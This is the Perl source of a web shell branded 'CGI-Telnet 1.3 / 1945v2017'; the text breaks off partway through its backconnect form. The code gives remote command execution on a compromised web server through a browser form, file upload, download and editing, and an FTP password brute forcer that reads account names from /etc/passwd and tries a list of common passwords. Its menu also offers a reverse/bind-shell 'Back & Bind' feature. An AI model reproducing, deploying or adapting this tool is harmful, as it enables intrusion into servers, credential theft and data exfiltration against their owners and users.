#!/usr/bin/perl -I/usr/local/bandmin
use MIME::Base64;
$Version= "CGI-Telnet Version 1.3";
$EditPersion="<font style='text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(300, 0, 0), 0px 0px 5px rgb(300, 0, 0); color:#ffffff; font-weight:bold;'>1945v2017 - CGI-Telnet</font>";

$Password = "";			# Change this. You will need to enter this to login.
sub Is_Win(){
	$os = &trim($ENV{"SERVER_SOFTWARE"});
	if($os =~ m/win/i){
		return 1;
	}
	else{
		return 0;
	}
}
$WinNT = &Is_Win();				# You need to change the value of this to 1 if
								# you're running this script on a Windows NT
								# machine. If you're running it on Unix, you
								# can leave the value as it is.

$NTCmdSep = "&";				# This character is used to seperate 2 commands
								# in a command line on Windows NT.

$UnixCmdSep = ";";				# This character is used to seperate 2 commands
								# in a command line on Unix.

$CommandTimeoutDuration = 10000;	# Time in seconds after commands will be killed
								# Don't set this to a very large value. This is
								# useful for commands that may hang or that
								# take very long to execute, like "find /".
								# This is valid only on Unix servers. It is
								# ignored on NT Servers.

$ShowDynamicOutput = 1;			# If this is 1, then data is sent to the
								# browser as soon as it is output, otherwise
								# it is buffered and send when the command
								# completes. This is useful for commands like
								# ping, so that you can see the output as it
								# is being generated.

# DON'T CHANGE ANYTHING BELOW THIS LINE UNLESS YOU KNOW WHAT YOU'RE DOING !!

$CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);
$CmdPwd = ($WinNT ? "cd" : "pwd");
$PathSep = ($WinNT ? "\\" : "/");
$Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");
$cols= 150;
$rows= 26;
#------------------------------------------------------------------------------
# Reads the input sent by the browser and parses the input variables. It
# parses GET, POST and multipart/form-data that is used for uploading files.
# The filename is stored in $in{'f'} and the data is stored in $in{'filedata'}.
# Other variables can be accessed using $in{'var'}, where var is the name of
# the variable. Note: Most of the code in this function is taken from other CGI
# scripts.
#------------------------------------------------------------------------------
sub ReadParse 
{
	local (*in) = @_ if @_;
	local ($i, $loc, $key, $val);
	
	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;

	if($ENV{'REQUEST_METHOD'} eq "GET")
	{
		$in = $ENV{'QUERY_STRING'};
	}
	elsif($ENV{'REQUEST_METHOD'} eq "POST")
	{
		binmode(STDIN) if $MultipartFormData & $WinNT;
		read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
	}

	# handle file upload data
	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
	{
		$Boundary = '--'.$1; # please refer to RFC1867 
		@list = split(/$Boundary/, $in); 
		$HeaderBody = $list[1];
		$HeaderBody =~ /\r\n\r\n|\n\n/;
		$Header = $`;
		$Body = $';
 		$Body =~ s/\r\n$//; # the last \r\n was put in by Netscape
		$in{'filedata'} = $Body;
		$Header =~ /filename=\"(.+)\"/; 
		$in{'f'} = $1; 
		$in{'f'} =~ s/\"//g;
		$in{'f'} =~ s/\s//g;

		# parse trailer
		for($i=2; $list[$i]; $i++)
		{ 
			$list[$i] =~ s/^.+name=$//;
			$list[$i] =~ /\"(\w+)\"/;
			$key = $1;
			$val = $';
			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} = $val; 
		}
	}
	else # standard post data (url encoded, not multipart)
	{
		@in = split(/&/, $in);
		foreach $i (0 .. $#in)
		{
			$in[$i] =~ s/\+/ /g;
			($key, $val) = split(/=/, $in[$i], 2);
			$key =~ s/%(..)/pack("c", hex($1))/ge;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} .= "\0" if (defined($in{$key}));
			$in{$key} .= $val;
		}
	}
}

#------------------------------------------------------------------------------
# Prints the HTML Page Header
# Argument 1: Form item name to which focus should be set
#------------------------------------------------------------------------------
sub PrintPageHeader
{
	$EncodedCurrentDir = $CurrentDir;
	$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
	my $dir =$CurrentDir;
	$dir=~ s/\\/\\\\/g;
	print "Content-type: text/html\n\n";
	print <<END;
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>1945v2017 - CGI Telnet</title>

$HtmlMetaHeader

</head>
<style>
body{
font: 10pt Verdana;
}
tr {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
color: #ff9900;
}
td {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
color: #2BA8EC;
font: 10pt Verdana;
}

table {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
BACKGROUND-COLOR: #111;
}


input {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
BACKGROUND-COLOR: Black;
font: 10pt Verdana;
color: #ff9900;
}

input.submit {
text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan;
color: #FFFFFF;
border-color: #009900;
}

code {
border			: dashed 0px #333;
BACKGROUND-COLOR: Black;
font: 10pt Verdana bold;
color: while;
}

run {
border			: dashed 0px #333;
font: 10pt Verdana bold;
color: #FF00AA;
}

textarea {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
BACKGROUND-COLOR: #1b1b1b;
font: Fixedsys bold;
color: #aaa;
}
A:link {
	COLOR: #2BA8EC; TEXT-DECORATION: none
}
A:visited {
	COLOR: #2BA8EC; TEXT-DECORATION: none
}
A:hover {
	text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan;
	color: #ff9900; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}

.listdir tr:hover{
	background: #444;
}
.listdir tr:hover td{
	background: #444;
	text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan;
	color: #FFFFFF; TEXT-DECORATION: none;
}
.notline{
	background: #111;
}
.line{
	background: #222;
}
</style>
<script language="javascript">
function chmod_form(i,file)
{
	/*var ajax='ajax_PostData("FormPerms_'+i+'","$ScriptLocation","ResponseData"); return false;';*/
	var ajax="";
	document.getElementById("FilePerms_"+i).innerHTML="<form name=FormPerms_" + i+ " action=' method='POST'><input id=text_" + i + "  name=chmod type=text size=5 /><input type=submit class='submit' onclick='" + ajax + "' value=OK><input type=hidden name=a value='gui'><input type=hidden name=d value='$dir'><input type=hidden name=f value='"+file+"'></form>";
	document.getElementById("text_" + i).focus();
}
function rm_chmod_form(response,i,perms,file)
{
	response.innerHTML = "<span onclick=\\\"chmod_form(" + i + ",'"+ file+ "')\\\" >"+ perms +"</span></td>";
}
function rename_form(i,file,f)
{
	var ajax="";
	f.replace(/\\\\/g,"\\\\\\\\");
	var back="rm_rename_form("+i+",\\\""+file+"\\\",\\\""+f+"\\\"); return false;";
	document.getElementById("File_"+i).innerHTML="<form name=FormPerms_" + i+ " action=' method='POST'><input id=text_" + i + "  name=rename type=text value= '"+file+"' /><input type=submit class='submit' onclick='" + ajax + "' value=OK><input type=submit class='submit' onclick='" + back + "' value=Cancel><input type=hidden name=a value='gui'><input type=hidden name=d value='$dir'><input type=hidden name=f value='"+file+"'></form>";
	document.getElementById("text_" + i).focus();
}
function rm_rename_form(i,file,f)
{
	if(f=='f')
	{
		document.getElementById("File_"+i).innerHTML="<a href='?a=command&d=$dir&c=edit%20"+file+"%20'>" +file+ "</a>";
	}else
	{
		document.getElementById("File_"+i).innerHTML="<a href='?a=gui&d="+f+"'>[ " +file+ " ]</a>";
	}
}
</script>
<body onLoad="document.f.@_.focus()" bgcolor="#0c0c0c" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0">
<center><code>
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
	<td align="center" rowspan=2>
		<b><font size="5">$EditPersion</font></b>
	</td>

	<td>

		<font face="Verdana" size="2">$ENV{"SERVER_SOFTWARE"}</font>
	</td>
	<td>Server IP:<font color="#bb0000"> $ENV{'SERVER_ADDR'}</font> | Your IP: <font color="#bb0000">$ENV{'REMOTE_ADDR'}</font>
	</td>

</tr>

<tr>
<td colspan="3"><font face="Verdana" size="2">
<a href="$ScriptLocation">Home</a> | 
<a href="$ScriptLocation?a=command&d=$EncodedCurrentDir">Command</a> |
<a href="$ScriptLocation?a=gui&d=$EncodedCurrentDir">GUI</a> | 
<a href="$ScriptLocation?a=upload&d=$EncodedCurrentDir">Upload File</a> | 
<a href="$ScriptLocation?a=download&d=$EncodedCurrentDir">Download File</a> |

<a href="$ScriptLocation?a=backbind">Back & Bind</a> |
<a href="$ScriptLocation?a=bruteforcer">Brute Forcer</a> |
<a href="$ScriptLocation?a=checklog">Check Log</a> |
<a href="$ScriptLocation?a=domainsuser">Domains/Users</a> |
<a href="$ScriptLocation?a=logout">Logout</a> |
<a target='_blank' href="#">Help</a>

</font></td>
</tr>
</table>
<font id="ResponseData" color="#ff99cc" >
END
}

#------------------------------------------------------------------------------
# Prints the Login Screen
#------------------------------------------------------------------------------
sub PrintLoginScreen
{

	print <<END;
<pre><script type="text/javascript">
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;	// Never run.
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
  if(this.running) return;
  if(typeof this.origText == "undefined") {
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience.
    return;
  }
  if(this.currentText == "") this.element.innerHTML = "";
//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
  if(this.currentChar < this.origText.length) {
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
      this.tagBuffer = "<";
      this.inTag = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
      this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
      this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
      this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
    this.currentChar++;
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
  } else {
	this.currentText = "";
	this.currentChar = 0;
        this.running = false;
        this.finishedCallback();
  }
}
</script>
</pre>

<font style="font: 15pt Verdana; color: yellow;">Copyright (C) 2001 Rohitab Batra </font><br><br>
<table align="center" border="1" width="600" heigh>
<tbody><tr>
<td valign="top" background="http://dl.dropbox.com/u/10860051/images/matran.gif"><p id="hack" style="margin-left: 3px;">
<font color="#009900"> Please Wait . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font> <br>

<font color="#009900"> Trying connect to Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">~\$</font> Connected ! </font><br>
<font color="#009900"><font color="#FFF000">$ServerName~</font> Checking Server . . . . . . . . . . . . . . . . . . .</font> <br>

<font color="#009900"><font color="#FFF000">$ServerName~</font> Trying connect to Command . . . . . . . . . . .</font><br>

<font color="#F00000"><font color="#FFF000">$ServerName~</font>\$ Connected Command! </font><br>
<font color="#009900"><font color="#FFF000">$ServerName~<font color="#F00000">\$</font></font> OK! You can kill it!</font>
</tr>
</tbody></table>
<br>

<script type="text/javascript">
new TypingText(document.getElementById("hack"), 30, function(i){ var ar = new Array("_",""); return " " + ar[i.length % ar.length]; });
TypingText.runAll();

</script>
END
}

#------------------------------------------------------------------------------
# Add html special chars
#------------------------------------------------------------------------------
sub HtmlSpecialChars($){
	my $text = shift;
	$text =~ s/&/&amp;/g;
	$text =~ s/"/&quot;/g;
	$text =~ s/'/&#039;/g;
	$text =~ s/</&lt;/g;
	$text =~ s/>/&gt;/g;
	return $text;
}
#------------------------------------------------------------------------------
# Add link for directory
#------------------------------------------------------------------------------
sub AddLinkDir($)
{
	my $ac=shift;
	my @dir=();
	if($WinNT)
	{
		@dir=split(/\\/,$CurrentDir);
	}else
	{
		@dir=split("/",&trim($CurrentDir));
	}
	my $path="";
	my $result="";
	foreach (@dir)
	{
		$path .= $_.$PathSep;
		$result.="<a href='?a=".$ac."&d=".$path."'>".$_.$PathSep."</a>";
	}
	return $result;
}
#------------------------------------------------------------------------------
# Prints the message that informs the user of a failed login
#------------------------------------------------------------------------------
sub PrintLoginFailedMessage
{
	print <<END;
<br>Login : Administrator<br>

Password:<br>
Login incorrect<br><br>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form for logging in
#------------------------------------------------------------------------------
sub PrintLoginForm
{
	print <<END;
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="login">
Login : Administrator<br>
Password:<input type="password" name="p">
<input class="submit" type="submit" value="Enter">
</form>
END
}

#------------------------------------------------------------------------------
# Prints the footer for the HTML Page
#------------------------------------------------------------------------------
sub PrintPageFooter
{
	print "<br><font color=red>o---[  <font color=#ff9900>Edit by $EditPersion </font>  ]---o</font></code></center></body></html>";
}

#------------------------------------------------------------------------------
# Retreives the values of all cookies. The cookies can be accesses using the
# variable $Cookies{'}
#------------------------------------------------------------------------------
sub GetCookies
{
	@httpcookies = split(/; /,$ENV{'HTTP_COOKIE'});
	foreach $cookie(@httpcookies)
	{
		($id, $val) = split(/=/, $cookie);
		$Cookies{$id} = $val;
	}
}

#------------------------------------------------------------------------------
# Prints the screen when the user logs out
#------------------------------------------------------------------------------
sub PrintLogoutScreen
{
	print "Connection closed by foreign host.<br><br>";
}

#------------------------------------------------------------------------------
# Logs out the user and allows the user to login again
#------------------------------------------------------------------------------
sub PerformLogout
{
	print "Set-Cookie: SAVEDPWD=;\n"; # remove password cookie
	&PrintPageHeader("p");
	&PrintLogoutScreen;

	&PrintLoginScreen;
	&PrintLoginForm;
	&PrintPageFooter;
	exit;
}

#------------------------------------------------------------------------------
# This function is called to login the user. If the password matches, it
# displays a page that allows the user to run commands. If the password doens't
# match or if no password is entered, it displays a form that allows the user
# to login
#------------------------------------------------------------------------------
sub PerformLogin 
{
	if($LoginPassword eq $Password) # password matched
	{
		print "Set-Cookie: SAVEDPWD=$LoginPassword;\n";
		&PrintPageHeader;
		print &ListDir;
	}
	else # password didn't match
	{
		&PrintPageHeader("p");
		&PrintLoginScreen;
		if($LoginPassword ne "") # some password was entered
		{
			&PrintLoginFailedMessage;

		}
		&PrintLoginForm;
		&PrintPageFooter;
		exit;
	}
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to enter commands
#------------------------------------------------------------------------------
sub PrintCommandLineInputForm
{
	my $dir= "<span style='font: 11pt Verdana; font-weight: bold;'>".&AddLinkDir("command")."</span>";
	$Prompt = $WinNT ? "$dir > " : "<font color='#66ff66'>[admin\@$ServerName $dir]\$</font> ";
	return <<END;
<form name="f" method="POST" action="$ScriptLocation">

<input type="hidden" name="a" value="command">

<input type="hidden" name="d" value="$CurrentDir">
$Prompt
<input type="text" size="50" name="c">
<input class="submit"type="submit" value="Enter">
</form>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to download files
#------------------------------------------------------------------------------
sub PrintFileDownloadForm
{
	my $dir = &AddLinkDir("download"); 
	$Prompt = $WinNT ? "$dir > " : "[admin\@$ServerName $dir]\$ ";
	return <<END;
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="download">
$Prompt download<br><br>
Filename: <input class="file" type="text" name="f" size="35"><br><br>
Download: <input class="submit" type="submit" value="Begin">

</form>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to upload files
#------------------------------------------------------------------------------
sub PrintFileUploadForm
{
	my $dir= &AddLinkDir("upload");
	$Prompt = $WinNT ? "$dir > " : "[admin\@$ServerName $dir]\$ ";
	return <<END;
<form name="f" enctype="multipart/form-data" method="POST" action="$ScriptLocation">
$Prompt upload<br><br>
Filename: <input class="file" type="file" name="f" size="35"><br><br>
Options: &nbsp;<input type="checkbox" name="o" id="up" value="overwrite">
<label for="up">Overwrite if it Exists</label><br><br>
Upload:&nbsp;&nbsp;&nbsp;<input class="submit" type="submit" value="Begin">
<input type="hidden" name="d" value="$CurrentDir">
<input class="submit" type="hidden" name="a" value="upload">

</form>

END
}

#------------------------------------------------------------------------------
# This function is called when the timeout for a command expires. We need to
# terminate the script immediately. This function is valid only on Unix. It is
# never called when the script is running on NT.
#------------------------------------------------------------------------------
sub CommandTimeout
{
	if(!$WinNT)
	{
		alarm(0);
		return <<END;
</textarea>
<br><font color=yellow>
Command exceeded maximum time of $CommandTimeoutDuration second(s).</font>
<br><font size='6' color=red>Killed it!</font>
END
	}
}



#------------------------------------------------------------------------------
# This function displays the page that contains a link which allows the user
# to download the specified file. The page also contains a auto-refresh
# feature that starts the download automatically.
# Argument 1: Fully qualified filename of the file to be downloaded
#------------------------------------------------------------------------------
sub PrintDownloadLinkPage
{
	local($FileUrl) = @_;
	my $result="";
	if(-e $FileUrl) # if the file exists
	{
		# encode the file link so we can send it to the browser
		$FileUrl =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
		$DownloadLink = "$ScriptLocation?a=download&f=$FileUrl&o=go";
		$HtmlMetaHeader = "<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"1; URL=$DownloadLink\">";
		&PrintPageHeader("c");
		$result .= <<END;
Sending File $TransferFile...<br>

If the download does not start automatically,
<a href="$DownloadLink">Click Here</a>
END
		$result .= &PrintCommandLineInputForm;
	}
	else # file doesn't exist
	{
		$result .= "Failed to download $FileUrl: $!";
		$result .= &PrintFileDownloadForm;
	}
	return $result;
}

#------------------------------------------------------------------------------
# This function reads the specified file from the disk and sends it to the
# browser, so that it can be downloaded by the user.
# Argument 1: Fully qualified pathname of the file to be sent.
#------------------------------------------------------------------------------
sub SendFileToBrowser
{
	my $result = "";
	local($SendFile) = @_;
	if(open(SENDFILE, $SendFile)) # file opened for reading
	{
		if($WinNT)
		{
			binmode(SENDFILE);
			binmode(STDOUT);
		}
		$FileSize = (stat($SendFile))[7];
		($Filename = $SendFile) =~  m!([^/^\\]*)$!;
		print "Content-Type: application/x-unknown\n";
		print "Content-Length: $FileSize\n";
		print "Content-Disposition: attachment; filename=$1\n\n";
		print while(<SENDFILE>);
		close(SENDFILE);
		exit(1);
	}
	else # failed to open file
	{
		$result .= "Failed to download $SendFile: $!";
		$result .=&PrintFileDownloadForm;
	}
	return $result;
}


#------------------------------------------------------------------------------
# This function is called when the user downloads a file. It displays a message
# to the user and provides a link through which the file can be downloaded.
# This function is also called when the user clicks on that link. In this case,
# the file is read and sent to the browser.
#------------------------------------------------------------------------------
sub BeginDownload
{
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		&SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		&PrintDownloadLinkPage($TargetFile);
	}
}

#------------------------------------------------------------------------------
# This function is called when the user wants to upload a file. If the
# file is not specified, it displays a form allowing the user to specify a
# file, otherwise it starts the upload process.
#------------------------------------------------------------------------------
sub UploadFile
{
	# if no file is specified, print the upload form again
	if($TransferFile eq "")
	{
		return &PrintFileUploadForm;

	}
	my $result="";
	# start the uploading process
	$result .= "Uploading $TransferFile to $CurrentDir...<br>";

	# get the fullly qualified pathname of the file to be created
	chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\\\/]$/;
	$TransferFile =~ m!([^/^\\]*)$!;
	$TargetName .= $PathSep.$1;

	$TargetFileSize = length($in{'filedata'});
	# if the file exists and we are not supposed to overwrite it
	if(-e $TargetName && $Options ne "overwrite")
	{
		$result .= "Failed: Destination file already exists.<br>";
	}
	else # file is not present
	{
		if(open(UPLOADFILE, ">$TargetName"))
		{
			binmode(UPLOADFILE) if $WinNT;
			print UPLOADFILE $in{'filedata'};
			close(UPLOADFILE);
			$result .= "Transfered $TargetFileSize Bytes.<br>";
			$result .= "File Path: $TargetName<br>";
		}
		else
		{
			$result .= "Failed: $!<br>";
		}
	}
	$result .= &PrintCommandLineInputForm;
	return $result;
}

#------------------------------------------------------------------------------
# This function is called when the user wants to download a file. If the
# filename is not specified, it displays a form allowing the user to specify a
# file, otherwise it displays a message to the user and provides a link
# through  which the file can be downloaded.
#------------------------------------------------------------------------------
sub DownloadFile
{
	# if no file is specified, print the download form again
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		return &PrintFileDownloadForm;
	}
	
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) | (!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		return &SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		return &PrintDownloadLinkPage($TargetFile);
	}
}


#------------------------------------------------------------------------------
# This function is called to execute commands. It displays the output of the
# command and allows the user to enter another command. The change directory
# command is handled differently. In this case, the new directory is stored in
# an internal variable and is used each time a command has to be executed. The
# output of the change directory command is not displayed to the users
# therefore error messages cannot be displayed.
#------------------------------------------------------------------------------
sub ExecuteCommand
{
	my $result="";
	if($RunCommand =~ m/^\s*cd\s+(.+)/) # it is a change dir command
	{
		# we change the directory internally. The output of the
		# command is not displayed.
		$Command = "cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
		chop($CurrentDir = `$Command`);
		$result .= &PrintCommandLineInputForm;

		$result .= "Command: <run>$RunCommand </run><br><textarea cols='$cols' rows='$rows' spellcheck='false'>";
		# xuat thong tin khi chuyen den 1 thu muc nao do!
		$RunCommand= $WinNT?"dir":"dir -lia";
		$result .= &RunCmd;
	}elsif($RunCommand =~ m/^\s*edit\s+(.+)/)
	{
		$result .=  &SaveFileForm;
	}else
	{
		$result .= &PrintCommandLineInputForm;
		$result .= "Command: <run>$RunCommand</run><br><textarea id='data' cols='$cols' rows='$rows' spellcheck='false'>";
		$result .=&RunCmd;
	}
	$result .=  "</textarea>";
	return $result;
}

#------------------------------------------------------------------------
# run command
#------------------------------------------------------------------------

sub RunCmd
{
	my $result="";
	$Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;
	if(!$WinNT)
	{
		$SIG{'ALRM'} = \&CommandTimeout;
		alarm($CommandTimeoutDuration);
	}
	if($ShowDynamicOutput) # show output as it is generated
	{
		$|=1;
		$Command .= " |";
		open(CommandOutput, $Command);
		while(<CommandOutput>)
		{
			$_ =~ s/(\n|\r\n)$//;
			$result .= &HtmlSpecialChars("$_\n");
		}
		$|=0;
	}
	else # show output after command completes
	{
		$result .= &HtmlSpecialChars('$Command');
	}
	if(!$WinNT)
	{
		alarm(0);
	}
	return $result;
}
#==============================================================================
# Form Save File 
#==============================================================================
sub SaveFileForm
{
	my $result ="";
	substr($RunCommand,0,5)="";
	my $file=&trim($RunCommand);
	$save='<br><input name="a" type="submit" value="save" class="submit" >';
	$File=$CurrentDir.$PathSep.$RunCommand;
	my $dir="<span style='font: 11pt Verdana; font-weight: bold;'>".&AddLinkDir("gui")."</span>";
	if(-w $File)
	{
		$rows="23"
	}else
	{
		$msg="<br><font style='font: 15pt Verdana; color: yellow;' > Permission denied!<font><br>";
		$rows="20"
	}
	$Prompt = $WinNT ? "$dir > " : "<font color='#FFFFFF'>[admin\@$ServerName $dir]\$</font> ";
	$read=($WinNT)?"type":"less";
	$RunCommand = "$read \"$RunCommand\"";
	$result .=  <<END;
	<form name="f" method="POST" action="$ScriptLocation">

	<input type="hidden" name="d" value="$CurrentDir">
	$Prompt
	<input type="text" size="40" name="c">
	<input name="s" class="submit" type="submit" value="Enter">
	<br>Command: <run> $RunCommand </run>
	<input type="hidden" name="file" value="$file" > $save <br> $msg
	<br><textarea id="data" name="data" cols="$cols" rows="$rows" spellcheck="false">
END
	
	$result .= &RunCmd;
	$result .=  "</textarea>";
	$result .=  "</form>";
	return $result;
}
#==============================================================================
# Save File
#==============================================================================
sub SaveFile($)
{
	my $Data= shift ;
	my $File= shift;
	$File=$CurrentDir.$PathSep.$File;
	if(open(FILE, ">$File"))
	{
		binmode FILE;
		print FILE $Data;
		close FILE;
		return 1;
	}else
	{
		return 0;
	}
}
#------------------------------------------------------------------------------
# Brute Forcer Form
#------------------------------------------------------------------------------
sub BruteForcerForm
{
	my $result="";
	$result .= <<END;

<table>

<tr>
<td colspan="2" align="center">
####################################<br>
Simple FTP brute forcer<br>
####################################
<form name="f" method="POST" action="$ScriptLocation">

<input type="hidden" name="a" value="bruteforcer"/>
</td>
</tr>
<tr>
<td>User:<br><textarea rows="18" cols="30" name="user">
END
chop($result .= `less /etc/passwd | cut -d: -f1`);
$result .= <<'END';
</textarea></td>
<td>

Pass:<br>
<textarea rows="18" cols="30" name="pass">123pass
123!@#
123admin
123abc
123456admin
1234554321
12344321
pass123
admin
admincp
administrator
matkhau
passadmin
p@ssword
p@ssw0rd
password
123456
1234567
12345678
123456789
1234567890
111111
000000
222222
333333
444444
555555
666666
777777
888888
999999
123123
234234
345345
456456
567567
678678
789789
123321
456654
654321
7654321
87654321
987654321
0987654321
admin123
admin123456
abcdef
abcabc
!@#!@#
!@#$%^
!@#$%^&*(
!@#$$#@!
abc123
anhyeuem
iloveyou</textarea>
</td>
</tr>
<tr>
<td colspan="2" align="center">
Sleep:<select name="sleep">

<option>0</option>
<option>1</option>
<option>2</option>

<option>3</option>
</select> 
<input type="submit" class="submit" value="Brute Forcer"/></td></tr>
</form>
</table>
END
return $result;
}
#------------------------------------------------------------------------------
# Brute Forcer
#------------------------------------------------------------------------------
sub BruteForcer
{
	my $result="";
	$Server=$ENV{'SERVER_ADDR'};
	if($in{'user'} eq "")
	{
		$result .= &BruteForcerForm;
	}else
	{
		use Net::FTP; 
		@user= split(/\n/, $in{'user'});
		@pass= split(/\n/, $in{'pass'});
		chomp(@user);
		chomp(@pass);
		$result .= "<br><br>[+] Trying brute $ServerName<br>====================>>>>>>>>>>>><<<<<<<<<<====================<br><br>\n";
		foreach $username (@user)
		{
			if(!($username eq ""))
			{
				foreach $password (@pass)
				{
					$ftp = Net::FTP->new($Server) or die "Could not connect to $ServerName\n"; 
					if($ftp->login("$username","$password"))
					{
						$result .= "<a target='_blank' href='ftp://$username:$password\@$Server'>[+] ftp://$username:$password\@$Server</a><br>\n";
						$ftp->quit();
						break;
					}
					if(!($in{'sleep'} eq "0"))
					{
						sleep(int($in{'sleep'}));
					}
					$ftp->quit();
				}
			}
		}
		$result .= "\n<br>==========>>>>>>>>>> Finished <<<<<<<<<<==========<br>\n";
	}
	return $result;
}
#------------------------------------------------------------------------------
# Backconnect Form
#------------------------------------------------------------------------------
sub BackBindForm
{
	return <<END;
	<br><br>

	<table>
	<tr>
	<form name="f" method="POST" action="$ScriptLocation">
	<td>BackConnect: <input type="hidden" name="a" value="backbind"></td>
	<td> Host: <input type="text" size="20" name="clientaddr" value="$ENV{'REMOTE_ADDR'}">
	 Port: <input type="text" size="7" name="clientport" value="80" onkeyup="document.getElementById('ba').innerHTML=this.value;"></td>

	<td><input name="s" class="submit" type="submit" name="submit" value="Connect"></td>
	</form>
	</tr>
	<tr>
